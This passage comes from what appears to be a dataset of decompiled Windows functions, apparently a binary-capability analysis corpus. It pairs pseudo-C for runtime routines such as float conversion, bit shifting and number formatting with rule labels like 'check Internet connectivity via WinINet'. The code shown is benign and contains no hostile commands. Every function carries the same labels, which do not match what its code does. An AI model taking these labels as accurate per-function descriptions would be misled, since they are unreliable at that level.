((-uStack52 & 0x1f) != (uVar16 ^ 0x1f)) {\n                        uStack52 = uStack52 + 1;\n                    }\n                    uStack56 = 0x21;\n                }\n            }\n            goto code_r0x00420234;\n        }\n        goto code_r0x00420550;\n    }\n    *(iStack40 + 0x10) = 1;\n    *(iStack40 + 0x14) = 1;\n    uStack52 = 1;\n    uStack56 = 0x21;\n    uStack48 = (uVar34 - 1) + uVar19;\ncode_r0x0042055b:\n    uStack180 = uVar34 - uStack180;\n    if (uStack180 != 0) {\n        if (uStack180 < 1) {\n            uVar26 = -uStack180;\n            fcn.00426330(iStack40, uVar26);\n        }\n        else {\n            uVar26 = uStack180;\n            iStack40 = fcn.00426f00(iStack40, uStack180);\n        }\n        uStack48 = uStack48 - uStack180;\n        uStack180 = 0;\n    }\ncode_r0x00420247:\n    *param_4 = uStack48;\n    fcn.00426a80(iVar14, uVar26);\n    fcn.00426a80(puStack188, uVar26);\n    fcn.00426a80(uStack204, uVar26);\n    fcn.00426a80(iVar10, uVar26);\n    fcn.00426a80(iVar12, uVar26);\n    if (param_3[2] < uStack48) {\n        uVar16 = param_3[3] & 3;\n        if (uVar16 == 2) {\n            if (iStack140 == 0) goto code_r0x0041fb68;\n        }\n        else if (uVar16 == 3) {\n            if (iStack140 != 0) goto code_r0x0041fb68;\n        }\n        else if (uVar16 == 1) {\ncode_r0x0041fb68:\n            uStack56 = 0xa3;\n            *(iStack40 + 0x10) = 0;\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n            *param_4 = param_3[2] + 1;\n            goto code_r0x0041fba2;\n        }\n        fcn.00426a80(iStack40, uVar26);\n        iStack40 = 0;\n        uStack56 = 0x11;\n        *param_4 = param_3[2];\n        uVar16 = *param_3;\n        puVar9 = param_5 + (uVar16 + 0x1f >> 5);\n        puVar17 = param_5;\n        if (param_5 < puVar9) {\n            do {\n                puVar18 = puVar17 + 1;\n                *puVar17 = 0xffffffff;\n                puVar17 = puVar18;\n            } while (puVar18 < puVar9);\n        }\n        uVar16 = uVar16 & 0x1f;\n        if (uVar16 != 0) {\n            puVar9[-1] = puVar9[-1] >> (0x20U - uVar16 & 0x1f);\n        }\n    }\ncode_r0x0041fba2:\n    if (uStack180 != 0) {\n        if (uStack116 == 0) {\n            uVar16 = uStack56 & 0x30;\n            uStack56 = uStack56 & 0xfffffff8;\n            if (0 < *(iStack40 + 0x10)) {\n                uStack56 = uStack56 | 2;\n            }\n            if (uVar16 != 0) {\ncode_r0x0041f460:\n                uStack56 = uStack56 | 0x40;\n                puVar9 = sub.msvcrt.dll__errno();\n                *puVar9 = 0x22;\n            }\n        }\n        else {\ncode_r0x0041f7d5:\n            *(iStack40 + 0x10) = 0;\n            uStack56 = 0x50;\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n        }\n    }\ncode_r0x0041f3d1:\n    if (param_2 != NULL) {\n        *param_2 = puStack44;\n    }\n    if (iStack140 != 0) {\n        uStack56 = uStack56 | 8;\n    }\ncode_r0x0041f3fc:\n    if (iStack40 != 0) {\n        fcn.00427670(param_5, uVar34, iStack40);\n        fcn.00426a80(iStack40, uVar34);\n    }\n    return uStack56;\n}\n",
        "token_count": 10977
    },
    "00420ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00420ce0(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    ushort *puVar2;\n    \n    if (-1 < param_2) {\n        if (0xf < param_2) {\n            uVar3 = param_2 - 0x10;\n            puVar1 = in_EAX + 4;\n            do {\n                do {\n                    puVar2 = puVar1 + 1;\n                    *puVar1 = *puVar2;\n                    puVar1 = puVar2;\n                } while (puVar2 != in_EAX + 0x10);\n                param_2 = param_2 - 0x10;\n                *(in_EAX + 0x10) = 0;\n                puVar1 = in_EAX + 4;\n            } while (param_2 != (uVar3 & 0xf));\n            param_2 = uVar3 & 0xf;\n        }\n        if (7 < param_2) {\n            puVar8 = in_EAX + 0x10;\n            uVar7 = 0;\n            do {\n                uVar5 = *puVar8;\n                puVar9 = puVar8 + -1;\n                *puVar8 = uVar5 << 8 | uVar7;\n                puVar8 = puVar9;\n                uVar7 = uVar5 >> 8;\n            } while (in_EAX + 2 != puVar9);\n            param_2 = param_2 & 7;\n        }\n        for (; param_2 != 0; param_2 = param_2 - 1) {\n            uVar3 = 0;\n            puVar8 = in_EAX + 0x10;\n            do {\n                if (*puVar8 < 0) {\n                    uVar3 = uVar3 | 1;\n                }\n                uVar7 = *puVar8 * 2;\n                if ((uVar3 & 2) != 0) {\n                    uVar7 = uVar7 | 1;\n                }\n                puVar9 = puVar8 + -1;\n                uVar3 = uVar3 * 2;\n                *puVar8 = uVar7;\n                puVar8 = puVar9;\n            } while (puVar9 != in_EAX + 2);\n        }\n        return false;\n    }\n    uVar3 = -param_2;\n    if (param_2 < -0xf) {\n        uVar7 = 0;\n        do {\n            uVar7 = uVar7 | *(in_EAX + 0x10);\n            iVar6 = 6;\n            do {\n                *(in_EAX + 4 + iVar6 * 2) = *(in_EAX + 2 + iVar6 * 2);\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            uVar3 = uVar3 - 0x10;\n            *(in_EAX + 4) = 0;\n        } while (0xf < uVar3);\n    }\n    else {\n        uVar7 = 0;\n    }\n    if (7 < uVar3) {\n        uVar7 = uVar7 | *(in_EAX + 0x10);\n        puVar8 = in_EAX + 4;\n        iVar6 = 0;\n        do {\n            uVar5 = *puVar8;\n            puVar9 = puVar8 + 1;\n            *puVar8 = uVar5 >> 8 | iVar6;\n            puVar8 = puVar9;\n            iVar6 = uVar5 << 8;\n        } while (puVar9 != in_EAX + 0x12);\n        uVar3 = uVar3 & 7;\n    }\n    if (uVar3 != 0) {\n        do {\n            uVar4 = 0;\n            uVar7 = uVar7 | *(in_EAX + 0x10) & 1;\n            puVar8 = in_EAX + 4;\n            do {\n                if ((*puVar8 & 1) != 0) {\n                    uVar4 = uVar4 | 1;\n                }\n                uVar5 = *puVar8 >> 1;\n                if ((uVar4 & 2) != 0) {\n                    uVar5 = uVar5 | 0x8000;\n                }\n                puVar9 = puVar8 + 1;\n                uVar4 = uVar4 * 2;\n                *puVar8 = uVar5;\n                puVar8 = puVar9;\n            } while (in_EAX + 0x12 != puVar9);\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return uVar7 != 0;\n}\n",
        "token_count": 1117
    },
    "00421360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00421360(int16_t *param_1, uint *param_2)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int16_t *piVar3;\n    uint16_t uVar5;\n    int16_t *piVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    int16_t *piVar4;\n    \n    uVar5 = param_1[1];\n    piVar3 = param_1 + 3;\n    if ((uVar5 & 0x7fff) == 0x7fff) {\n        iVar1 = *piVar3;\n        while( true ) {\n            if (iVar1 != 0) {\n                *param_2 = 0;\n                param_2[1] = 0xc0000000;\n                param_2[2] = 0x7fff;\n                return;\n            }\n            piVar3 = piVar3 + 1;\n            if (param_1 + 9 == piVar3) break;\n            iVar1 = *piVar3;\n        }\n    }\n    else if (uVar5 == 0) {\n        puVar7 = param_1 + 2;\n        do {\n            if ((*puVar7 & 1) != 0) {\n                uVar5 = uVar5 | 1;\n            }\n            uVar2 = *puVar7 >> 1;\n            if ((uVar5 & 2) != 0) {\n                uVar2 = uVar2 | 0x8000;\n            }\n            puVar8 = puVar7 + 1;\n            uVar5 = uVar5 * 2;\n            *puVar7 = uVar2;\n            puVar7 = puVar8;\n        } while (param_1 + 9 != puVar8);\n    }\n    *(param_2 + 10) = 0;\n    if (*param_1 == 0) {\n        *(param_2 + 2) = param_1[1];\n        uVar5 = param_1[1];\n    }\n    else {\n        *(param_2 + 2) = param_1[1] | 0x8000;\n        uVar5 = param_1[1];\n    }\n    if ((uVar5 & 0x7fff) == 0x7fff) {\n        piVar3 = param_1 + 3;\n        while (*piVar3 == 0) {\n            piVar3 = piVar3 + 1;\n            if (piVar3 == param_1 + 9) {\n                *param_2 = 0;\n                param_2[1] = 0x80000000;\n                return;\n            }\n        }\n    }\n    piVar3 = param_1 + 3;\n    piVar6 = param_2 + 6;\n    do {\n        piVar4 = piVar3 + 1;\n        *piVar6 = *piVar3;\n        piVar3 = piVar4;\n        piVar6 = piVar6 + -1;\n    } while (param_1 + 7 != piVar4);\n    return;\n}\n",
        "token_count": 692
    },
    "00421780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004219ea)\n\nvoid fcn.00421780(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5, int32_t param_6)\n\n{\n    bool bVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    ushort *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint uStack34;\n    uint uStack30;\n    uint uStack26;\n    uint uStack22;\n    ushort uStack18;\n    \n    uStack18 = 0;\n    uStack34 = 0;\n    uStack30 = 0;\n    uStack26 = 0;\n    uStack22 = 0x10000;\n    iVar4 = fcn.004215d0(param_1);\n    param_4 = param_4 - iVar4;\n    if ((0x50 < iVar4) && (param_4 < 0x7fff)) {\ncode_r0x0042181e:\n        *(param_1 + 2) = 0;\n        *(param_1 + 6) = 0;\n        *(param_1 + 10) = 0;\n        *(param_1 + 0xe) = 0;\n        return;\n    }\n    uVar10 = param_2;\n    if (param_4 < 0) {\n        if (param_4 < -0x50) goto code_r0x0042181e;\n        iVar4 = fcn.00420ce0();\n        uVar10 = 1;\n        if (iVar4 == 0) {\n            uVar10 = param_2;\n        }\n    }\n    param_2 = uVar10;\n    if (param_5 == 0) goto code_r0x004217e3;\n    if (param_6 == 0x40) {\n        uStack22 = 1;\n        iStack60 = 0xe;\n        iStack52 = 6;\n        iStack56 = 7;\n    }\n    else {\n        iStack60 = 0x10;\n        iStack52 = 7;\n        iStack56 = 8;\n    }\n    bVar1 = param_4 < 1 && param_6 != 0x50;\n    if (bVar1) {\n        param_2 = param_2 | *(param_1 + 0x10) & 1;\n        puVar7 = param_1 + 4;\n        do {\n            puVar8 = puVar7 + 1;\n            *puVar7 = *puVar7 >> 1;\n            puVar7 = puVar8;\n        } while (param_1 + 0x12 != puVar8);\n    }\n    uVar2 = *(iStack60 + param_1);\n    if ((param_6 < 0x50) && (iStack56 == 7)) {\n        if (*(param_1 + 0x10) != 0) {\n            uVar2 = uVar2 | 1;\n        }\n        *(param_1 + 0x10) = 0;\n    }\n    *(iStack60 + param_1) = 0;\n    if (-1 < uVar2) goto code_r0x004218d1;\n    if (uVar2 == 0x8000) {\n        if (param_2 == 0) {\n            if ((*(param_1 + iStack52 * 2) & 1) != 0) goto code_r0x00421980;\n        }\n        else if (param_3 == 0) goto code_r0x00421980;\n    }\n    else {\ncode_r0x00421980:\n        iVar4 = 7;\n        uVar10 = 0;\n        uVar9 = 0;\n        while( true ) {\n            uVar9 = uVar10 + *(param_1 + 2 + iVar4 * 2) + uVar9;\n            *(param_1 + 2 + iVar4 * 2) = uVar9;\n            uVar9 = uVar9 >> 0x10 & 1;\n            iVar4 = iVar4 + -1;\n            if (iVar4 == 0) break;\n            uVar10 = *(&uStack34 + iVar4 * 2 + 2);\n        }\n    }\ncode_r0x004218d1:\n    if (bVar1) {\n        uVar10 = 0;\n        puVar7 = param_1 + 0x10;\n        do {\n            if (*puVar7 < 0) {\n                uVar10 = uVar10 | 1;\n            }\n            uVar2 = *puVar7 * 2;\n            if ((uVar10 & 2) != 0) {\n                uVar2 = uVar2 | 1;\n            }\n            puVar8 = puVar7 + -1;\n            uVar10 = uVar10 * 2;\n            *puVar7 = uVar2;\n            puVar7 = puVar8;\n        } while (param_1 + 2 != puVar8);\n    }\n    uVar2 = *(param_1 + 4);\n    if (uVar2 != 0) {\n        uVar10 = 0;\n        puVar7 = param_1 + 4;\n        while( true ) {\n            if ((uVar2 & 1) != 0) {\n                uVar10 = uVar10 | 1;\n            }\n            uVar3 = uVar2 >> 1;\n            if ((uVar10 & 2) != 0) {\n                uVar3 = uVar2 >> 1 | 0x8000;\n            }\n            puVar8 = puVar7 + 1;\n            uVar10 = uVar10 * 2;\n            *puVar7 = uVar3;\n            if (param_1 + 0x12 == puVar8) break;\n            uVar2 = *puVar8;\n            puVar7 = puVar8;\n        }\n        param_4 = param_4 + 1;\n    }\ncode_r0x004217e3:\n    *(param_1 + 0x10) = 0;\n    if (0x7ffe < param_4) {\n        *(param_1 + 2) = 0x7fff;\n        puVar5 = param_1 + 4;\n        do {\n            puVar6 = puVar5 + 1;\n            *puVar5 = 0;\n            puVar5 = puVar6;\n        } while (param_1 + 0x10 != puVar6);\n        return;\n    }\n    if (param_4 < 0) {\n        param_4 = 0;\n    }\n    *(param_1 + 2) = param_4;\n    return;\n}\n",
        "token_count": 1561
    },
    "00421a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00421a80(int16_t *param_1, uint *param_2)\n\n{\n    uint16_t uVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    \n    uVar1 = param_1[1] | 0x8000;\n    if (*param_1 == 0) {\n        uVar1 = param_1[1];\n    }\n    *(param_2 + 10) = uVar1;\n    piVar3 = param_1 + 3;\n    if (param_1[1] != 0x7fff) {\n        puVar4 = param_2 + 2;\n        do {\n            piVar2 = piVar3 + 1;\n            *puVar4 = *piVar3;\n            piVar3 = piVar2;\n            puVar4 = puVar4 + -2;\n        } while (piVar2 != param_1 + 8);\n        return;\n    }\n    do {\n        if (*piVar3 != 0) {\n            *param_2 = 0;\n            param_2[1] = 0;\n            param_2[2] = 0x7fffc000;\n            return;\n        }\n        piVar3 = piVar3 + 1;\n    } while (param_1 + 9 != piVar3);\n    *(param_2 + 10) = *(param_2 + 10) | 0x7fff;\n    *param_2 = 0;\n    param_2[1] = 0;\n    *(param_2 + 2) = 0;\n    return;\n}\n",
        "token_count": 366
    },
    "00421b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00421b10(uint *param_1, uint *param_2, uint *param_3)\n\n{\n    int16_t iVar1;\n    ushort uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint16_t uVar8;\n    uint16_t uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int16_t iStack52;\n    uint16_t uStack50;\n    int16_t aiStack48 [6];\n    int16_t iStack36;\n    int16_t iStack34;\n    uint16_t uStack32;\n    int16_t aiStack30 [6];\n    int16_t iStack18;\n    \n    uVar8 = *(param_1 + 10) & 0x7fff;\n    if (uVar8 == 0x7fff) {\n        puVar7 = param_1;\n        do {\n            puVar12 = puVar7 + 2;\n            if (*puVar7 != 0) {\n                *param_3 = *param_1;\n                param_3[1] = param_1[1];\n                param_3[2] = param_1[2];\n                return;\n            }\n            puVar7 = puVar12;\n        } while (puVar12 != param_1 + 10);\n    }\n    uVar9 = *(param_2 + 10) & 0x7fff;\n    puVar7 = param_1;\n    if (uVar9 == 0x7fff) {\n        puVar12 = param_2;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) {\n                *param_3 = *param_2;\n                param_3[1] = param_2[1];\n                param_3[2] = param_2[2];\n                return;\n            }\n            puVar12 = puVar11;\n        } while (puVar11 != param_2 + 10);\n        if (uVar8 == 0x7fff) goto code_r0x00421b5e;\ncode_r0x00421c72:\n        puVar12 = param_2;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) goto code_r0x00421d62;\n            puVar12 = puVar11;\n        } while (puVar11 != param_2 + 10);\n        if (*(param_1 + 2) == 0) {\n            puVar12 = param_1 + 1;\n            do {\n                if (*puVar12 != 0) goto code_r0x00421d62;\n                puVar12 = puVar12 + 2;\n            } while (puVar12 != param_1 + 4);\ncode_r0x00421b9d:\n            *param_3 = 0;\n            param_3[1] = 0;\n            param_3[2] = 0x7fffc000;\n            return;\n        }\ncode_r0x00421d62:\n        if (uVar8 == 0x7fff) goto code_r0x00421ded;\ncode_r0x00421d6d:\n        puVar12 = param_2;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) goto code_r0x00421bc0;\n            puVar12 = puVar11;\n        } while (param_2 + 10 != puVar11);\n        if (uVar8 != 0x7fff) goto code_r0x00421d8c;\n    }\n    else {\n        if (uVar8 != 0x7fff) {\ncode_r0x00421bc0:\n            fcn.00420eb0(param_1, &iStack52);\n            fcn.00420eb0(param_2, &iStack34);\n            uVar10 = uStack50;\n            uVar6 = uStack32;\n            if (uStack50 == 0) {\n                piVar3 = aiStack48;\n                do {\n                    if (piVar3 == &iStack36) goto code_r0x00421cb3;\n                    iVar1 = *piVar3;\n                    piVar3 = piVar3 + 1;\n                } while (iVar1 == 0);\n                iVar4 = fcn.004215d0(&iStack52);\n                uVar10 = -iVar4;\n            }\n            piVar3 = aiStack30;\n            if (uStack32 == 0) {\n                do {\n                    if (&iStack18 == piVar3) {\ncode_r0x00421cb3:\n                        *param_3 = 0;\n                        param_3[1] = 0;\n                        param_3[2] = 0;\n                        return;\n                    }\n                    iVar1 = *piVar3;\n                    piVar3 = piVar3 + 1;\n                } while (iVar1 == 0);\n                iVar4 = fcn.004215d0(&iStack34);\n                uVar6 = uVar6 - iVar4;\n            }\n            uVar5 = fcn.00421250(&iStack52, &iStack34);\n            fcn.00421780(&iStack34, uVar5, 0, (uVar10 - 0x3ffe) + uVar6, 0x40, 0x50);\n            iStack34 = (iStack52 == iStack34) - 1;\n            fcn.00421a80(&iStack34, param_3);\n            return;\n        }\ncode_r0x00421b5e:\n        puVar12 = param_1;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) goto code_r0x00421de0;\n            puVar12 = puVar11;\n        } while (puVar11 != param_1 + 10);\n        if (*(param_2 + 2) == 0) {\n            puVar12 = param_2 + 1;\n            do {\n                if (*puVar12 != 0) goto code_r0x00421de0;\n                puVar12 = puVar12 + 2;\n            } while (puVar12 != param_2 + 4);\n            goto code_r0x00421b9d;\n        }\ncode_r0x00421de0:\n        if (uVar9 == 0x7fff) goto code_r0x00421c72;\ncode_r0x00421ded:\n        puVar12 = param_1;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) {\n                if (uVar9 != 0x7fff) goto code_r0x00421bc0;\n                goto code_r0x00421d6d;\n            }\n            puVar12 = puVar11;\n        } while (param_1 + 10 != puVar11);\n    }\n    do {\n        puVar12 = puVar7 + 2;\n        if (*puVar7 != 0) {\n            uVar10 = 0;\n            goto code_r0x00421d8f;\n        }\n        puVar7 = puVar12;\n    } while (puVar12 != param_1 + 10);\ncode_r0x00421d8c:\n    uVar10 = *(param_1 + 10) >> 0x1f;\ncode_r0x00421d8f:\n    if (uVar9 == 0x7fff) {\n        puVar7 = param_2;\n        do {\n            puVar12 = puVar7 + 2;\n            if (*puVar7 != 0) {\n                uVar6 = 0;\n                goto code_r0x00421da4;\n            }\n            puVar7 = puVar12;\n        } while (puVar12 != param_2 + 10);\n    }\n    uVar6 = *(param_2 + 10) >> 0x1f;\ncode_r0x00421da4:\n    uVar2 = 0;\n    if (uVar6 != uVar10) {\n        uVar2 = 0x8000;\n    }\n    *param_3 = 0;\n    param_3[1] = 0;\n    *(param_3 + 10) = uVar2;\n    *(param_3 + 10) = *(param_3 + 10) | 0x7fff;\n    *(param_3 + 2) = 0;\n    return;\n}\n",
        "token_count": 1915
    },
    "004223e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004223e0(uint32_t param_1, char *param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(param_3 + 8);\n    if (param_1 < 1) {\n        if (iVar2 < 1) {\n            if (-1 < iVar2) goto code_r0x00422409;\n            *(param_3 + 8) = 0xffffffff;\n            goto joined_r0x0042256b;\n        }\n        iVar2 = iVar2 + -1;\n        *(param_3 + 8) = iVar2;\ncode_r0x00422409:\n        iVar1 = *(param_3 + 0xc);\n        if (iVar2 <= iVar1) {\n            *(param_3 + 8) = 0xffffffff;\n            if (0 < param_1) goto code_r0x004224c7;\n            goto joined_r0x0042256b;\n        }\n        iVar2 = iVar2 - iVar1;\n        *(param_3 + 8) = iVar2;\n        if ((iVar1 < 1) && ((*(param_3 + 4) & 0x800) == 0)) {\n            if ((0 < param_1) && (((*(param_3 + 4) & 0x1000) != 0 && (*(param_3 + 0x1c) != 0)))) {\ncode_r0x004224e1:\n                uVar3 = (param_1 + 2) / 3;\n                if (1 < uVar3) {\n                    if (0 < iVar2) {\n                        iVar1 = iVar2 - uVar3;\n                        do {\n                            iVar2 = iVar2 + -1;\n                            if (iVar1 + 1 == iVar2) {\n                                *(param_3 + 8) = iVar2;\n                                goto code_r0x00422515;\n                            }\n                        } while (iVar2 != 0);\n                        *(param_3 + 8) = 0;\n                    }\n                    goto joined_r0x0042256b;\n                }\n                goto code_r0x00422515;\n            }\n        }\n        else {\n            iVar2 = iVar2 + -1;\n            *(param_3 + 8) = iVar2;\n            if ((0 < param_1) && (((*(param_3 + 5) & 0x10) != 0 && (*(param_3 + 0x1c) != 0)))) goto code_r0x004224e1;\ncode_r0x00422515:\n            if (iVar2 < 1) goto joined_r0x0042256b;\n        }\n        if (in_EAX == 0) {\n            uVar3 = *(param_3 + 4);\n            if ((uVar3 & 0x1c0) == 0) {\n                if (((uVar3 & 0x600) == 0) && (iVar2 = *(param_3 + 8),  *(param_3 + 8) = iVar2 + -1,  0 < iVar2))\n                goto code_r0x00422550;\n            }\n            else {\n                *(param_3 + 8) = iVar2 + -1;\n                if (iVar2 + -1 != 0) goto code_r0x00422541;\n            }\n            goto code_r0x0042242e;\n        }\n        *(param_3 + 8) = iVar2 + -1;\n        if (iVar2 + -1 != 0) {\n            uVar3 = *(param_3 + 4);\ncode_r0x00422541:\n            if ((uVar3 & 0x600) == 0) {\n                *(param_3 + 8) = iVar2 + -2;\ncode_r0x00422550:\n                do {\n                    fcn.00421fc0();\n                    iVar2 = *(param_3 + 8);\n                    *(param_3 + 8) = iVar2 + -1;\n                } while (0 < iVar2);\n            }\n            goto joined_r0x0042256b;\n        }\ncode_r0x00422571:\n        fcn.00421fc0();\n    }\n    else {\n        if (param_1 <= iVar2) {\n            iVar2 = iVar2 - param_1;\n            *(param_3 + 8) = iVar2;\n            goto code_r0x00422409;\n        }\n        *(param_3 + 8) = 0xffffffff;\ncode_r0x004224c7:\n        if (((*(param_3 + 5) & 0x10) != 0) && (iVar2 = -1,  *(param_3 + 0x1c) != 0)) goto code_r0x004224e1;\njoined_r0x0042256b:\n        if (in_EAX != 0) goto code_r0x00422571;\n        uVar3 = *(param_3 + 4);\ncode_r0x0042242e:\n        if ((uVar3 & 0x100) == 0) {\n            if ((uVar3 & 0x40) != 0) {\n                fcn.00421fc0();\n            }\n        }\n        else {\n            fcn.00421fc0();\n        }\n    }\n    if ((0 < *(param_3 + 8)) && ((*(param_3 + 4) & 0x600) == 0x200)) {\n        *(param_3 + 8) = *(param_3 + 8) + -1;\n        do {\n            fcn.00421fc0();\n            iVar2 = *(param_3 + 8);\n            *(param_3 + 8) = iVar2 + -1;\n        } while (0 < iVar2);\n    }\n    if (param_1 < 1) {\n        fcn.00421fc0();\n        iVar2 = *(param_3 + 0xc);\n        if ((iVar2 < 1) && ((*(param_3 + 5) & 8) == 0)) {\n            if (param_1 == 0) goto code_r0x0042259f;\n        }\n        else {\n            fcn.00422300();\n            if (param_1 == 0) goto code_r0x004225fa;\n            iVar2 = *(param_3 + 0xc);\n        }\n        *(param_3 + 0xc) = iVar2 + param_1;\n        do {\n            fcn.00421fc0();\n            param_1 = param_1 + 1;\n        } while (param_1 != 0);\n        iVar2 = *(param_3 + 0xc);\n        *(param_3 + 0xc) = iVar2 + -1;\n        if (0 < iVar2) goto code_r0x004225e1;\n    }\n    else {\n        while( true ) {\n            if (*param_2 != '\\0') {\n                param_2 = param_2 + 1;\n            }\n            fcn.00421fc0();\n            param_1 = param_1 - 1;\n            if (param_1 == 0) break;\n            if ((((*(param_3 + 5) & 0x10) != 0) && (*(param_3 + 0x1c) != 0)) && (param_1 == (param_1 / 3) * 3)) {\n                fcn.00422020();\n            }\n        }\n        iVar2 = *(param_3 + 0xc);\n        if ((0 < iVar2) || ((*(param_3 + 5) & 8) != 0)) {\n            fcn.00422300();\ncode_r0x004225fa:\n            while (iVar2 = *(param_3 + 0xc),  *(param_3 + 0xc) = iVar2 + -1,  0 < iVar2) {\ncode_r0x004225e1:\n                if (*param_2 != '\\0') {\n                    param_2 = param_2 + 1;\n                }\n                fcn.00421fc0();\n            }\n            return;\n        }\ncode_r0x0042259f:\n        *(param_3 + 0xc) = iVar2 + -1;\n    }\n    return;\n}\n",
        "token_count": 1837
    },
    "00422820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00422820(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    int64_t iVar10;\n    int32_t aiStack80 [5];\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t uStack44;\n    char *pcStack40;\n    char *var_20h;\n    uint32_t uStack32;\n    uint var_ch;\n    \n    var_34h = *(param_1 + 0xc);\n    uStack44 = *(param_1 + 4);\n    var_38h = *(param_1 + 8);\n    aiStack80[0] = 0x422872;\n    var_20h = in_EAX;\n    uStack32 = param_2;\n    iVar2 = fcn.00418950();\n    iVar2 = -iVar2;\n    pcStack40 = &fcn.00422820::var_2ch + iVar2 + 3 & 0xfffffff0;\n    if ((uStack44 & 0x80) != 0) {\n        if (uStack32 < 0) {\n            bVar9 = var_20h != NULL;\n            var_20h = -var_20h;\n            uStack32 = -(uStack32 + bVar9);\n        }\n        else {\n            uStack44 = uStack44 & 0xffffff7f;\n            *(param_1 + 4) = uStack44;\n        }\n    }\n    iVar10 = CONCAT44(uStack32, var_20h);\n    var_2ch = uStack44 & 0x1000;\n    pcVar4 = pcStack40;\n    if ((uStack32 | var_20h) != 0) {\n        var_30h = param_1;\n        var_20h = pcStack40;\n        while( true ) {\n            pcVar5 = var_20h;\n            uVar7 = iVar10 >> 0x20;\n            *(&stack0xffffffb4 + iVar2) = iVar10;\n            *(&stack0xffffffb8 + iVar2) = uVar7;\n            *(&stack0xffffffbc + iVar2) = 10;\n            *(&stack0xffffffc0 + iVar2) = 0;\n            var_20h = pcVar5 + 1;\n            *(&stack0xffffffb0 + iVar2) = 0x4228e7;\n            cVar1 = fcn.00418a80();\n            *pcVar5 = cVar1 + '0';\n            *(&stack0xffffffb4 + iVar2) = iVar10;\n            *(&stack0xffffffb8 + iVar2) = uVar7;\n            *(&stack0xffffffbc + iVar2) = 10;\n            *(&stack0xffffffc0 + iVar2) = 0;\n            *(&stack0xffffffb0 + iVar2) = 0x422908;\n            iVar10 = fcn.00418980();\n            pcVar4 = var_20h;\n            param_1 = var_30h;\n            if (iVar10 == 0) 